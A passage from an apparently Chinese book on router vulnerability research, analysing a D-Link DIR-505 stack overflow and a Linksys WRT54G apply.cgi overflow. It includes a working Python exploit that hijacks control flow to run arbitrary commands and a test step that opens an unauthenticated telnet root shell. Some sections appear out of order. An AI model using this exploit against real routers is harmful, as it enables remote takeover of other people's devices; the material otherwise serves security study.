<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>测试环境</td><td style='text-align: center; word-wrap: break-word;'>备注</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>操作系统</td><td style='text-align: center; word-wrap: break-word;'>Ubuntu 12.04</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>文件系统提取工具</td><td style='text-align: center; word-wrap: break-word;'>Binwalk 2.0</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>调试器</td><td style='text-align: center; word-wrap: break-word;'>IDA 6.1</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>利用代码解释器</td><td style='text-align: center; word-wrap: break-word;'>Python 2.7</td><td style='text-align: center; word-wrap: break-word;'></td></tr></table>

## 12.1 漏洞介绍

D-Link DIR-505 路由器是一款便携式无线路由器，如图 12-1 所示，它不仅具有普通无线路由器的功能，而且插上 U 盘就可以强力变身为一台多媒体及文件服务器。即便我们没有容量足够的内存卡，也可以随时播放该 U 盘里的电影、音乐等多媒体文件，还可以共享文件。

 </div>

但就是这样一款不可多得的智能路由器，研究人员却在它上面发现了一个可以被利用的漏洞。D-Link 官方安全公告 http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10029 如图 12-2 所示。

 </div>

从漏洞的公告中可以看出，该漏洞存在于名为“my_cgi.cgi”的 CGI 脚本中。这个漏洞比较特殊，造成漏洞的原因并不是常见的危险函数将大缓冲区复制到小缓冲区造成溢出，而是在目的缓冲区和源缓冲区之间以字节为单位循环赋值转储时，对边界验证不合理导致程序越界访问源缓冲区，最终造成缓冲区溢出。溢出发生后，攻击者可以获得路由器的远程控制权。

分析环境说明如表 12-2 所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>描述</td><td style='text-align: center; word-wrap: break-word;'>备注</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>型号</td><td style='text-align: center; word-wrap: break-word;'>DIR505</td><td style='text-align: center; word-wrap: break-word;'>D-Link</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>硬件版本</td><td style='text-align: center; word-wrap: break-word;'>A1</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>固件版本</td><td style='text-align: center; word-wrap: break-word;'>V1.08</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>指令系统</td><td style='text-align: center; word-wrap: break-word;'>MIPSEL</td><td style='text-align: center; word-wrap: break-word;'>小端机格式</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>QEMU</td><td style='text-align: center; word-wrap: break-word;'>1.7.90</td><td style='text-align: center; word-wrap: break-word;'>处理器模拟软件</td></tr></table>

该漏洞影响的部分路由器及固件版本如下。

D-Link DIR-505 1.01~1.08

D-Link DIR-505L 1.01 及之前版本

D-Link DSP-W215 1.02

D-Link DSP-W215 1.08B10

D-Link DAP-1320 1.02b07 及之前版本

## 12.2 漏洞分析

下面我们对该漏洞进行详细分析。

#### 12.2.1 固件分析

从 D-Link 官方技术支持网站下载固件，下载链接为 ftp://ftp2.dlink.com/PRODUCTS/DIR-505/REVA/DIR-505_FIRMWARE_1.08B10.ZIP，解压缩后得到固件 DIR505A1_FW108B10.bin。

使用 Binwalk 将固件中的文件系统提取出来，如图 12-3 所示。

 </div>

该漏洞的核心组件为 /usr/bin/my_cgi.cgi，如图 12-4 所示。

 </div>

#### 12.2.2 漏洞成因分析

该组件（my_cgi.cgi）可以说是漏洞百出，已经发现并公布了多个漏洞，这里我们对其中一个比较典型的漏洞进行分析。

在许多与漏洞相关的书籍中都会提到“漏洞危险函数”这个概念。例如，在 C++ 程序中的危险函数 strcpy、sprintf、fgetc 等。我们之所以说这个漏洞比较特殊，是因为这个漏洞并不是由常见的危险函数引发的，而是因为该漏洞是数组越界访问造成的缓冲区溢出。

对这个漏洞的分析，仍然使用 QEMU 模拟运行，编写的 Shell 脚本如下。

#!/bin/bash
#sudo ./run_cgi.sh
INPUT='python -c "print 'storage_path='+'B'*477472+'A'*4"
LEN=$(echo -n "$INPUT" | wc -c)
PORT="1234"
if ["$LEN" == "0"] || [ "$INPUT" == "-h"] || [ "$UID" != "0"]
then
echo -e "\nUsage: sudo $0 \n"
exit 1
fi
cp $(which qemu-mips) ./qemu
echo "$INPUT" | chroot ./qemu -E CONTENT LENGTH=$LEN -E
CONTENT TYPE="maultipart/form-data" -E SCRIPT NAME="common" -E
REQUEST METHOD="POST" -E REQUEST URI="/my_cgi.cgi" -g $PORT
/usr/bin/my_cgi.cgi 2>/dev/null
echo 'you'
rm -f ./qemu

第 3 行：该漏洞位于 POST 参数中。但因为这里需要构造的参数太长，所以我们将参数构造放入脚本中，不再使用参数进行传递。

第 12 行：使用 QEMU 执行 my_cgi.cgi。

这个脚本中还有两点需要注意：一是 CONTENT_TYPE 不能为 “multipart/form-data”，二是 SCRIPT_NAME 不能是 “HNAP1”。

因为该漏洞的问题在于处理 POST 参数中 storage_path 参数的值时发生了缓冲区溢出，所以首先通过 IDA 加载 /usr/bin/my_cgi.cgi。搜索 “storage_path”，发现有 8 处调用了 storage_path，如图 12-5 所示。

xrefs to aStorage_path

Dire...

Up o print_table_info+214 addiu $a1, (aStorage_path - 0x440000) # "storage_path"
Up o getInputEntries+14C addiu $s6, $v0, (aStorage_path - 0x440000) # "storage_path"
Up o sub_42AF08+410 addiu $a1, (aStorage_path - 0x440000) # "storage_path"
Up o sub_42B584+414 addiu $a1, (aStorage_path - 0x440000) # "storage_path"
Up o sub_42BA64+3F4 addiu $a1, (aStorage_path - 0x440000) # "storage_path"
Up o sub_42BA64+53C addiu $a1, (aStorage_path - 0x440000) # "storage_path"
Up o sub_42C11C+390 addiu $a1, (aStorage_path - 0x440000) # "storage_path"
Up o get_input_entries+15C addiu $s4, $v0, (aStorage_path + 8 - 0x440000)

 </div>

在这 8 处调用中有一个 get_input_entries 函数，从字面上可以理解为该函数是获取输入项。这里我们不妨先看看 get_input_entries 函数。

在 get_input_entries 函数调用位置 0x0040A638 下断点，使用以下命令执行 run_cgi.sh。

~/book-source/505$ sudo ./run_cgi.sh

使用 IDA 附加调试，程序在 get_input_entries 函数中断以后，使用快捷键 “F7” 进入 get_input_entires 函数，对函数进行调试，结合动态调试观察数据变化，对代码进行分析，经过分析后如图 12-6 所示。

 </div>

0x00407AA4 处是一个 for 循环的判断语句，左边是 for 循环的循环体。对 get_input_entries 函数反汇编结合动态调试分析以后，可将 get_input_entries 函数编译成伪代码，具体如下。

get_input_entries 函数 for 循环体部分伪代码

#define WRITE_NAME 0
#define WRITE_VALUE 1
struct entries
{

char name[36]; // POST parameter name
char value[1025]; // POST parameter value
get_input_entries(struct entries *buf,int content_length)
{
    //post_data[] = "storage_path=AAAAA......"
    flag = WRITE_NAME;
    k = 0;
    count = 0;
    for (i = content_length; i > 0; i--)
    {
        if (post_data[i] == "="
        {
            // =
            flag = WRITE_VALUE;
            k = 0;
            continue;
        }
        else if (post_data[i] == "&")
        {
            flag = WRITE_NAME;
            k = 0;
            count++;
            continue;
        }
        if (flag == WRITE_NAME)
        {
            // name
            buf[count]->name[k] = post_data[i];
            else if (flag == WRITE_VALUE)
            {
                // value
                buf[count]->value[k] = post_data[i];
            }
        }
        if (count < 0x425)
        {
            return ;
        }
    }
}

从功能上看，get_input_entries 函数没有太大的问题，就是格式化 POST 中的参数。但有一个问题是该函数中没有大小限制，get_input_entries 格式化 POST 参数时依赖参数中的 content_length，将 HTTP 中提供的 POST 参数中长度为 content-length 的数据都格式化到堆栈上的局部变量 buf 中，但如果这里传递给 get_input_entries 函数的 content_length 的长度大于 buf 的长

度，就可能造成溢出。接下来，我们看看调用 get_input_entries 函数位置参数是如何传递的。

在 get_input_entries 函数中使用快捷键 “X” 定位到 main+0x7F8 处进行调用，如图 12-7 所示。

xrefs to get_input_entries

Dire...
Address
Text

L1.Do...p main:7F8
jsh $19.ge_Input_entries
L1.Do...o main+7F0
la $19, get_input_entries
L1.Do...o .got:get_input_entries_ptr .word get_input_entries

 </div>

get_input_entries 函数传入了两个参数，第一个参数是 “struct entries my_entries[450]” 的首地址，第二个参数是 content-length，如图 12-8 所示。

##### 伪代码

struct entries my_entries[450]; // total size: 477450 bytes
content_length = strtol(getenv("CONTENT_LENGTH"), 10);
memset(my_entries, 0, sizeof(my_entries));
num_entries = get_input_entries(&my_entries, content_length);

回N山
la $t9, memset
li $ac,
move $a0, $s0
jalr $t9 - memset
move $a1, $zero
lv $gp, 0x749A0+saved_gp($sp)
move $a0, $s0
la $t9, get_input_entries
nop

move $a1, $s2
li $v1,
addu $v1, $sp
sv $v0, $v1
lv $v1, $v1
li $v0,
lv $gp, 0x749A0+saved_gp($sp)

nop

 </div>

从 my_cgi.cgi 调用 get_input_entries 函数附近的伪代码，可以看出，content-length 来自 HTTP 协议的 content-length 字段，而结构体 my_entries 指向堆栈，大小为 477 450 字节，因此，get_input_entries 函数的 content-length 可以被攻击者控制，使 get_input_entries 函数完全复制提交的 POST 数据，并超出 my_entries 缓冲区大小，造成缓冲区溢出。至此，我们可以断定是 get_input_entries 函数提供了该漏洞的位置。

在这里，参数的伪造需要遵照“storage_path=xx”的形式，原因在于，当参数的名称为 storage_path 时，get_input_entries 函数不会对参数值调用 replace_spacial_char 函数进行解码，而是直接进入返回流程，否则 get_input_entries 函数在执行 replace_spacial_char 函数时会报错，进而导致程序直接崩溃，代码如图 12-9 所示。

 </div>

该漏洞是调用 get_input_entries 函数时，将 HTTP 协议中 content-length 字段的长度值在未经校验的情况下作为参数传递到 get_input_entries，而 get_input_entries 函数同样在没有校验 content_length 的长度值的情况下将 POST 参数中类似 “storage_path=xx” 格式的数据格式化到大小为 477 450 字节的缓冲区中，造成了缓冲区溢出。

## 12.3 漏洞利用

该漏洞的利用方式如下。

#### 12.3.1 漏洞利用方式：System/Exec

在分析了 DIR-505 路由器漏洞的细节以后，我们通过编写代码对该漏洞进行利用。我们可以在 my_cgi.cgi 中找到一个调用 system 函数的地址，虽然 my_cgi.cgi 的加载地址包含 “\x00”，但该漏洞的优点在于提交的 POST 参数中即使有 “\x00” 也不受影响，因此，my_cgi.cgi 程序中的 ROP 地址是可用的，可以在 my_cgi.cgi 中搜索指令构造 ROP Chain。

下面我们就开始定位偏移。如果在 POC 中没有给出偏移，或者偏移不正确，可以使用与

import sys
import urllib2
try:
    target = sys.argv[1]
    command = sys.argv[2]
except:
    print "Usage: %s <target> <command>" % sys.argv[0]
    sys.exit(1)
url = "http://%s/my_cgi.cgi" % target
buf = "storage_path=" # POST parameter name
buf += "D" * 477472 # Stack filler
buf += "\x00\x40\x5B\x1C" # Overwrite $ra
buf += "E" * 0x28 # Command to execute must be at $sp+0x28
buf += command
buf += "\x00" # NULL terminate the command
req = urllib2.Request(url, buf)
print urllib2.urlopen(req).read()

第 12 行：代码填充缓冲区。

第 13 行：覆盖 $ra 寄存器，劫持控制流程。

第 14 行：填充数据。

第 15 行：填充需要执行的命令。

 </div>

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td colspan="3">Xrefs to system</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Dire...</td><td style='text-align: center; word-wrap: break-word;'>Address</td><td style='text-align: center; word-wrap: break-word;'>Text</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>LUP</td><td style='text-align: center; word-wrap: break-word;'>j reset_statistic+78</td><td style='text-align: center; word-wrap: break-word;'>jr $t9 ; system</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>LUP</td><td style='text-align: center; word-wrap: break-word;'>p query_latest_fw+EO</td><td style='text-align: center; word-wrap: break-word;'>jalr $t9 ; system</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>LUP</td><td style='text-align: center; word-wrap: break-word;'>p get_remote_mac_EE</td><td style='text-align: center; word-wrap: break-word;'>jalr $t9; system</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>LUP</td><td style='text-align: center; word-wrap: break-word;'>p start_nbtscan+E8</td><td style='text-align: center; word-wrap: break-word;'>jalr $t9 ; system</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>LUP</td><td style='text-align: center; word-wrap: break-word;'>p execute_other_request...</td><td style='text-align: center; word-wrap: break-word;'>jalr $t9 ; system</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>LUP</td><td style='text-align: center; word-wrap: break-word;'>p main+C9</td><td style='text-align: center; word-wrap: break-word;'>jalr $t9 ; system</td></tr></table>

 </div>

在调用 system 的地址中搜索，发现 “get_remote_mac+CC”，0x405B1C 处的指令非常符合，其代码如图 12-13 所示。

 </div>

这里调用了 system("command") 函数，且参数 command 布置在返回地址偏移 +0x28 处即可，因此，最终的 ROP 布置如图 12-14 所示。

### 12.3.3 生成POC

根据前面的分析，利用代码参见 book-source/505/DIR505L-storage_path.py，示例如下。

之前的几个漏洞相同的方法进行定位。由于在该 POC 中已经给出了偏移，因此这里就不需要进行定位了。当然，测试该偏移是否正确依然是有必要的。通过以下命令运行 run_cgi.sh，测试偏移地址是否正确。

~/book-source/505/_DIR505A1_FW108B10.bin.extracted/squashfs-root$ sudo
./run_cgi.sh
[sudo] password for embedded:

因为 get_input_entries 函数是将 POST 参数解析到 main() 函数的堆栈，所以最终会导致 main() 函数的返回地址被覆盖。

在 IDA 中，在 main() 函数返回处 0x0040B30C 下断点，运行远程调试，当程序在断点处中断时查看寄存器，如图 12-10 所示。寄存器 $ra 被覆盖为 0x41414141，那么可以确定 run_cgi.sh 中的覆盖偏移是正确的，即 477472 字节的 “B”。接下来的 AAAA 劫持了程序执行流程。

 </div>

#### 12.3.2 构造ROP Chain

接下来开始构造 ROP Chain。我们需要在 my_cgi.cgi 中寻找 system 调用的位置，这里可以直接利用 IDA 交叉引用表查看 system 函数的调用情况。

在 “Function Name” 窗口找到 system 函数，双击即可在 “IDA-View-A” 标签页显示相关代码，如图 12-11 所示。

对 “IDA-View-A” 标签页中的 system 函数使用快捷键 “X” 查看所有调用该函数的位置，如图 12-12 所示。

## 12.4 漏洞测试

##### 测试环境

将 D-Link DIR-815 路由器与攻击机连接（有线或无线连接均可）。

##### 测试流程

01 打开网页，访问网关。这里网关是 192.168.100.1，浏览器访问 192.168.100.1，在首页上可以看到当前路由器的型号和固件版本。

02 执行测试脚本 DIR505-storage_path.py 192.168.100.1 "busybox telnetd -l /bin/sh"。

03 使用 Telnet 登录 192.168.100.1，命令为 “telnet 192.168.100.1”。

整个过程如图 12-15 所示。

 </div>

当然，也可以直接利用脚本执行命令，如图 12-16 所示，执行命令 “ls -l”。

制溢出数据覆盖 .extern 段中的函数调用地址，劫持系统函数调用，是上上之选。该漏洞就是使用这种利用方式，并在劫持系统函数调用之后使漏洞程序执行前面章节中编写的 Reverse_tcp 的 Shellcode 的。

The fourth vulnerability (CAN-2005-2799) exists in the apply.cgl handler script due to insufficient bounds checking when sending a POST request with a content-length longer than 10000 bytes.? This triggers a buffer overflow and could allow the attacker to execute arbitrary commands on the affected router with roof privileges.? The attacker could compromise the affected router, including changing passwords and firewall configuration.? The attacker could also upload new firmware or create a DoS condition.? The arbitrary code executes even if the attacker is unauthenticated.

 </div>

硬件和软件分析环境说明如表 13-2 所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>描述</td><td style='text-align: center; word-wrap: break-word;'>备注</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>型号</td><td style='text-align: center; word-wrap: break-word;'>WRT54G</td><td style='text-align: center; word-wrap: break-word;'>Linksys</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>硬件版本</td><td style='text-align: center; word-wrap: break-word;'>V2.2</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>固件版本</td><td style='text-align: center; word-wrap: break-word;'>V4.00.7</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>指令系统</td><td style='text-align: center; word-wrap: break-word;'>MIPSEL</td><td style='text-align: center; word-wrap: break-word;'>小端机格式</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>QEMU</td><td style='text-align: center; word-wrap: break-word;'>1.7.90</td><td style='text-align: center; word-wrap: break-word;'>处理器模拟软件</td></tr></table>

## 13.2 漏洞分析

下面详细分析一下这个漏洞产生的原因和利用方法。

#### 13.2.1 固件分析

下载 Linksys WRT54G 路由器 4.00.7 版本的固件，下载链接为 http://download.pchome.net/driver/network/route/wireless/down-129948-2.html，解压缩后得到固件 WRT54GV3.1_4.00.7_US_code.bin。

使用 Binwalk 将固件中的文件系统提取出来，如图 13-2 所示。

## 第 13 章 Linksys WRT54G 路由器 溢出漏洞分析——运行环境修复

本章实验测试环境说明如表 13-1 所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>测试环境</td><td style='text-align: center; word-wrap: break-word;'>备注</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>操作系统</td><td style='text-align: center; word-wrap: break-word;'>Ubuntu 12.04</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>文件系统提取工具</td><td style='text-align: center; word-wrap: break-word;'>Binwalk 2.0</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>调试器</td><td style='text-align: center; word-wrap: break-word;'>IDA 6.1</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>利用代码解释器</td><td style='text-align: center; word-wrap: break-word;'>Python 2.7</td><td style='text-align: center; word-wrap: break-word;'></td></tr></table>

## 13.1 漏洞介绍

Linksys WRT54G 是一款 SOHO 无线路由器，在功能、稳定性、双天线信号覆盖能力方面都得到了用户的认可。它还支持第三方固件，从而使其功能更加强大。不少用户购买 Linksys WRT54G 路由器就是为了刷第三方固件，使路由器具有可自由定制的功能。

Linksys WRT54G v2 版本的路由器曝出过一个漏洞，CVE 编号为 CVE-2005-2799。在 Cisco 官网（http://tools.cisco.com/security/center/viewAlert.x?alertId=9722）可以获取如图 13-1 所示的信息。

从漏洞的公告中我们可以看出，该漏洞存在于 WRT54G 路由器 Web 服务器程序 HTTPD 的 apply.cgi 处理脚本中，由于对发送的 POST 请求没有设置足够的边界与内容长度检查，当未经认证的远程攻击者向路由器的 apply.cgi 页面发送内容长度大于 10 000 字节的 POST 请求时，就可以触发缓冲区溢出。这个漏洞会允许未经认证的用户在受影响的路由器上以 root 权限执行任意命令。

该漏洞被覆盖的缓冲区并不在堆栈中，因此，在溢出后不会导致堆栈上的数据被覆盖，而是直接覆盖到漏洞程序的 .data 段，这时对漏洞的利用方式就与之前不同了。在这种情况下，控

##### 揭秘家用路由器 0day 漏洞挖掘技术

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td colspan="5">C:\Windows\system32\cmd.exe</td></tr></table>

 </div>

embedded@ubuntu-1/WRT54GV3.1.4.00.7 US code:bin.extracted/squashis-root
embedded@ubuntu-S binwalk -e HRT54GV3,1_4_00.7_US_code.bin

DEGIMAL HEXADEGIMAL DESCRIPTION

0x20 TRX firmware header, Little endian, header sizes: 2
8 bytes, Image size: 2875392 bytes, CRC32: 0xFF069BA6 flags: 0x0, version: 1
60 0x36 gzip compressed data, maximum compression, has ori
ginal file names: "piggy", from Unix, Last modified: Tue Apr 26 23:37:34 2005
686068 0x477F4 Squashis filesystem, Little endian, version 2.0, s
lze: 2185198 bytes, 298 nodes, block size: 65536 bytes, created: Tue Apr 26 23:37:37 2005

embedded@ubuntu-S cd_HRT54GV3.1.4.00.7 US code:bin.extracted/squashis-root/
embedded@ubuntu-1/HRT54GV3-1.4.00.7 US code:bin.extracted/squashis-root/
bin dev etc lib ont prog sbin trip USF WWW
embedded@ubuntu-1/HRT54GV3.1.4.00.7 US code:bin.extracted/squashis-root/

##### 图13-2

该漏洞的核心组件为 /usr/sbin/httpd，如图 13-3 所示。

(8)0) embedded@ubuntu:7/WRT54GV3414.00.7/US_code.bin.extracted/squashfs-root
embedded@ubuntu:5/_WRT54GV3.14.00.7_US_code.bin.extracted/squashfs-root3 find
-name httpd
/usr/sbin/httpd
embedded@ubuntu:5/_WRT54GV3.14.00.7_US_code.bin.extracted/squashfs-root3
/usr/sbin/httpd
-rwxr-xr-x 1 embedded embedded 351016 Apr 26 2005 d/usr/sbin/httpd
embedded@ubuntu:5/_WRT54GV3.14.00.7_US_code.bin.extracted/squashfs-root3

 </div>

#### 13.2.2 修复运行环境

从漏洞公告中我们已经知道，当路由器 HTTPD 的 apply.cgi 处理脚本接收长度大于 10 000 字节的 POST 请求时会触发缓冲区溢出漏洞。该漏洞的测试 POC 如下。

源码 wrt54g_test.py

1 import sys
2 import urllib2
3 try:
4     target = sys.argv[1]
5     except:
6         print "Usage: %s <target>" % sys.argv[0]
7     sys.exit(1)
8     url = "http://%s/apply.cgi" % target
9     buf = "\x42"\*10000+"\x41"\*0x4000  # POST parameter name
10    req = urllib2.Request(url, buf)
11    print urllib2.urlopen(req).read()

第 8 行：访问存在漏洞的 apply.cgi 处理脚本。

第9行：构造超过10 000字节的数据（这里我们构造一段足够长的数据）。

当我们使用模拟器（QEMU）运行路由器中的应用程序（如这里的 Web 服务器）时，经常会遇到一个问题——模拟器缺乏硬件的模拟，导致程序无法执行。而需要执行的 Web 服务器就是应用程序试图采用 NVRAM 中的信息来配置参数，但由于找不到设备导致了错误的发生。在路由器中，常见的 NVRAM 动态库 libnvram.so 提供了 nvram_get() 函数和 nvram_set() 函数来获取和设置配置参数。如果使用模拟器运行应用程序，会在调用 nvram_get() 函数时失败，导致应用程序无法运行（因为模拟器中没有 NVRAM）。使用如下命令运行 HTTPD，如图 13-4 所示。

 </div>

在运行的过程中可以看到，程序报错，提示找不到 /dev/nvram 文件或目录，且使用 netstat 命令查看当前系统开放的端口时没有发现 80 端口，Web 服务器启动失败。

# 1. 修复NVRAM

使用 zcutlip 的一个 nvram-faker 来修复 NVRAM。nvram-faker 虽然是一个简单的动态库，但可以使用 LD_PRELOAD 劫持 libnvram 库中的函数调用。我们只需要向一个 ini 的配置文件中写入合理的 NVRAM 配置，就可以使 Web 服务器程序运行。

nvram-faker 的下载方法如下。

$ git clone https://github.com/zcutlip/nvram-faker.git
$ ls
arch.mk    contrib    nvram-faker.c    nvram.ini
buildmipsel.sh    LICENSE.txt    nvram-faker.h    README.md
buildmips.sh    Makefile    nvram-faker-internal.h

在 nvram-faker 中提供了劫持 nvram_get() 函数的方法。为了让程序运行，还需要劫持一个函数，函数声明如下。

char *get_mac_from_ip(const char*ip);

为了方便使用 IDA 或者 GDB 调试，我们把 fork() 函数一并劫持，否则 fork() 函数产生的多进程会让调试过程异常复杂，函数声明如下。

int fork(void);

综上所述，我们需要对 nvram-faker 进行以下修改。

01 打开 nvram-faker.c，添加如下代码。

int fork(void)
{
    return 0;
}
char *get_mac_from_ip(const char*ip)
{
    char mac[]="00:50:56:C0:00:08";
    char *rmac = strdup(mac);
    return rmac;
}

代码添加后如图 13-5 所示。

02 修改 nvram-faker.h 头文件，添加函数声明如下。

char *get_mac_from_ip(const char*ip);
int fork(void);

修改后如图 13-6 所示。

03 保存所有文件，进入编译环节。在 /nvram-faker 目录下有两个 Shell 脚本：一个是 buildmips.sh，即用于编译大端机格式的动态库；另一个是 buildmipsel.sh，即用于编译小端机格式的动态库。WRT54G 路由器是小端机格式，所以这里使用 buildmipsel.sh 进行编译，命令如下。

embedded@ubuntu:~/nvram-faker/ $ sh buildmipsel.sh

embedded@ubuntu:~/nvram-faker/ $ ls

arch.mk ini.o

nvram-faker.c

nvram.ini

buildmipsel.sh libnvram-faker.so nvram-faker.h

README.md

buildmips.sh LICENSE.txt

nvram-faker-internal.h

contrib

Makefile

nvram-faker.o

 </div>

 </div>

编译好以后，会在 /nvram-faker 目录下生成一个名为 “libnvram-faker.so” 的动态库。将 libnvram-faker.so 和同目录下的 nvram.ini 复制到 WRT54G 路由器的根文件系统中，示例如下。

embedded@ubuntu:~/nvram-faker/ $ cp libnvram-faker.so .../
_WRT54GV3.1_4.00.7_US_code.bin.extracted/squashfs-root/
embedded@ubuntu:~/nvram-faker/ $ cp
nvram.ini .../_WRT54GV3.1_4.00.7_US_code.bin.extracted/squashfs-root/
embedded@ubuntu:~/_WRT54GV3.1_4.00.7_US_code.bin.extracted/squashfs-root/
$ ls
bin etc libnvram-faker.so nvram.ini sbin usr www
dev lib mnt proc tmp var

由于 libnvram-faker.so 使用了共享库编译，所以我们需要将 mipsel-linux-gcc 交叉编译环境中 lib 库下的 libgcc_s.so.1 复制到 WRT54G 路由器的根文件系统中，命令如下。

$ cp /opt/mipsel/output/target/lib/libgcc_s.so.1
~/_WRT54GV3.1_4.00.7_US_code.bin.extracted/squashfs-root/lib

# 2. 修复HTTPD执行环境

HTTPD 在运行时需要对 /var 目录下的某些文件进行操作，而这些文件是在 Linux 启动过程中才会产生的，因此，编写如下 prepare.sh 脚本修改 HTTPD 执行环境。

源码 prepare.sh
1 rm var
2 mkdir var
3 mkdir ./var/run
4 mkdir ./var/tmp
5 touch ./var/run/lock
6 touch ./var/run/crod.pid
7 touch httpd.pid

脚本 run_cgi.sh 提供了两种方法执行 HTTPD，一种是不需要调试器介入直接运行程序的执行模式，另一种是开放 1234 调试接口等待调试器连接。在 QEMU 环境中模拟执行 HTTPD 时，使用 LD_PRELOAD 环境变量加载 libnvram-faker.so 劫持函数调用，修复因硬件缺失导致的运行错误。增加的 HTTPD 脚本文件内容如下。

源码 run_cgi.sh
1 #!/bin/bash
2 DEBUG="$1"
3 LEN=$ (echo "$DEBUG" | wc -c)
4 # usage: sh run_cgi.sh debug #debug mode
5 # sh run_cgi.sh #execute mode

揭秘家用路由器 0day 漏洞挖掘技术

cp $(which gemu-mipsel) ./
if [ "$LEN" -eq 1 ]
then
echo "EXECUTE MODE !\n"
sudo chroot ././gemu-mipsel -E 'LD_PRELOAD="/libnvram-faker.so" ./usr/sbin/httpd
else
echo "DEBUG MODE !\n"
sudo chroot ././gemu-mipsel -E LD_PRELOAD="/libnvram-faker.so" -g 1234 ./usr/sbin/httpd
rm gemu-mipsel
fi

# 3. 测试和分析环境

测试和分析环境说明如表 13-3 所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>IP地址</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>测试主机（Windows实体机）</td><td style='text-align: center; word-wrap: break-word;'>192.168.90.11</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>虚拟主机（VMware Ubuntu）</td><td style='text-align: center; word-wrap: break-word;'>192.168.230.136</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>虚拟网关（VMware）</td><td style='text-align: center; word-wrap: break-word;'>192.168.230.1</td></tr></table>

网络拓扑如图 13-7 所示。

 </div>

#### 13.2.3 漏洞成因分析

运行 prepare.sh 脚本，修复 HTTPD 执行环境，命令如下。

$ sh prepare.sh

使用 run_cgi.sh 脚本调试模式执行 HTTPD，等待调试器连接，命令如下。

$ sh run_cgi.sh debug
DEBUG MODE !

使用 IDA 加载 HTTPD，进行远程附加调试，按 “F5” 键直接运行 HTTPD。待 HTTPD 服务开启后，在 Windows 下运行测试脚本 wrt54g-test.py，命令如下。

E:\>wrt54g_test.py 192.168.230.136

可以看到，Ubuntu 中的 HTTPD 程序已经崩溃了，现场如图 13-8 所示。阅读崩溃部分的代码，发现程序希望将 0 写入 0x41419851（0x41414141+0x5710）处时造成错误。其原因是：系统寻不到 0x41419851 这块内存，而 0x41414141 是我们发送的伪造数据，0x5710 正好是伪造的 POST 参数的总长度。同时，我们从崩溃现场还能知道，如果存在地址 0x41414141+0x5710，那么 0x004112D0 处会将地址 0x41414141 写入寄存器 $t9，并且在 0x00411208 处控制程序执行流程。这里的溢出数据已经把 .extern 段的 strlen 函数地址覆盖了。

 </div>

从汇编代码中可以看到，崩溃现场在 do_apply_post 函数的代码段中。从命名上可以知道，该函数的功能是处理 apply 的 POST 参数，正与漏洞公告中描述的一样。

下面，我们看一下崩溃现场附近的代码，分析造成漏洞的真正原因，如图 13-9 所示。

 </div>

在 do_apply_post 函数偏移  $ 0 \times 3C $ 处的伪代码如下。

1 wreadlen = wfread(post_buf, 1, content-length, fhandle);
2 if(wreadlen)
3   strlen(post_buf);

读取长度为 content-length 的所有 POST 数据到 post_buf，如果读取的 POST 数据长度不为 0，就计算 post_buf 中数据的长度。

这里的 content-length 是 POST 参数的长度，在调用 do_apply_post 函数时并没有进行校验，而该长度在使用读取数据进入内存时也没有进行校验就直接读取了 POST 参数，因此导致了缓冲区溢出。

我们再看看产生缓冲区溢出的内存 post_buf 的位置。可以看到，post_buf 位于 HTTPD 的 .data 段中，如图 13-10 所示。在应用程序中，.data 段用于存放已初始化的全局变量，这里的 post_buf 大小为 0x2710 字节（10 000 字节）。

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>data.10001ADC</td><td style='text-align: center; word-wrap: break-word;'>.word aUdhcpc_0</td><td style='text-align: center; word-wrap: break-word;'># DATA_REF_</td><td style='text-align: center; word-wrap: break-word;'>.data10001AD0</td><td style='text-align: center; word-wrap: break-word;'>.data10001AD0</td></tr></table>

 </div>

